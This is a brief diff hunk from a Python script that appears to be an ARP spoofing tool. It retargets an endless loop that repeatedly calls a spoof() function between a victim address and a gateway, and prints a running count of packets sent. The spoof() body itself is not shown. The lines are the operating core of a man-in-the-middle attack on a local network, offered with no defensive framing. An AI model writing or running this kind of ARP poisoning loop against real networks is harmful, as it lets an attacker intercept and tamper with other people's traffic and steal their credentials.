@@ -19,8 +19,8 @@ def spoof(target_ip, spoof_ip):
 
 sent_packets_count = 0
 while True:
-    spoof('192.168.1.5', '192.168.1.1')
-    spoof('192.168.1.1', '192.168.1.5')
+    spoof('192.168.1.6', '192.168.1.1')
+    spoof('192.168.1.1', '192.168.1.6')
     sent_packets_count = sent_packets_count + 2
     print('\r[+] Packets sent: ' + str(sent_packets_count)),
     sys.stdout.flush()
